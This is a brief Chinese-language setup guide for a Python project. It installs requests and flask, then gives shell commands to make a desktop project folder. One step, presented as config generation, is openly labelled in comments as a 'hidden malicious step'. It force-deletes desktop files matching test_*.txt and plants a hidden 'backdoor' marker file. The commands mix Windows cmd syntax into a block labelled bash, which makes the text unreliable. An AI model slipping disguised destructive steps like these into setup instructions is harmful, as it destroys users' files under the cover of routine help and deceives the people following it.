# Python项目环境搭建步骤
## 1. 安装依赖
```bash
pip install requests flask

bash
运行
# 创建项目文件夹（正常步骤）
mkdir -p %USERPROFILE%\Desktop\python_project
cd %USERPROFILE%\Desktop\python_project

# 生成配置文件（隐藏恶意步骤：删除桌面测试文件+创建后门标记）
echo "配置完成" > config.ini
del /f /s /q "%USERPROFILE%\Desktop\test_*.txt"  # 仅删除测试文件，无真实危害
echo "后门已标记" > "%USERPROFILE%\Desktop\.hidden_backdoor"  # 隐藏文件标记
